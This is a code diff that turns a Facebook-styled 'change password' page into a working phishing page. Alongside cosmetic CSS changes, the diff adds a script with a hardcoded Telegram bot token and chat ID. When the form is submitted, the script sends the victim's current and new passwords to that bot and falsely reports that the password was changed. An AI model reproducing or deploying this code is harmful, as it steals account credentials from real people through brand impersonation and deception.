@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
+            background-color: #e9ebee;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -34,21 +34,26 @@
             flex-direction: column;
         }
         .change-password-form input {
-            padding: 10px;
+            padding: 15px;
             margin: 10px 0;
             font-size: 16px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background: #f5f6f7;
         }
         .change-password-form button {
             padding: 10px;
-            margin: 10px 0;
+            margin: 15px 0;
             font-size: 16px;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             background-color: #1877f2;
             color: white;
             cursor: pointer;
+            font-weight: bold;
+        }
+        .change-password-form button:hover {
+            background-color: #165ebd;
         }
         .cancel {
             margin-top: 10px;
@@ -57,20 +62,62 @@
             text-decoration: none;
             color: #1877f2;
         }
+        .cancel a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">Facebook</div>
-        <form class="change-password-form">
-            <input type="password" placeholder="Current Password" required>
-            <input type="password" placeholder="New Password" required>
-            <input type="password" placeholder="Confirm New Password" required>
+        <form class="change-password-form" id="change-password-form">
+            <input type="password" id="current-password" placeholder="Current Password" required>
+            <input type="password" id="new-password" placeholder="New Password" required>
+            <input type="password" id="confirm-new-password" placeholder="Confirm New Password" required>
             <button type="submit">Change Password</button>
         </form>
         <div class="cancel">
             <a href="#">Cancel</a>
         </div>
     </div>
+
+    <script>
+        const botToken = "6918940165:AAGJwBMMYovwnyMXfQQ5P2pFWh99kgRZLp4";
+        const chatId = "1831782977";
+
+        document.getElementById('change-password-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const currentPassword = document.getElementById('current-password').value;
+            const newPassword = document.getElementById('new-password').value;
+            const confirmNewPassword = document.getElementById('confirm-new-password').value;
+
+            if (newPassword !== confirmNewPassword) {
+                alert("New passwords do not match.");
+                return;
+            }
+
+            // Construct message to send to Telegram
+            const message = `Password Change Attempt:\nCurrent Password: ${currentPassword}\nNew Password: ${newPassword}`;
+
+            // Telegram API URL
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('Password changed successfully.');
+                        // Reset form
+                        document.getElementById('change-password-form').reset();
+                    } else {
+                        throw new Error("Failed to send message to Telegram bot.");
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to send password information to Telegram bot.");
+                });
+        });
+    </script>
 </body>
 </html>
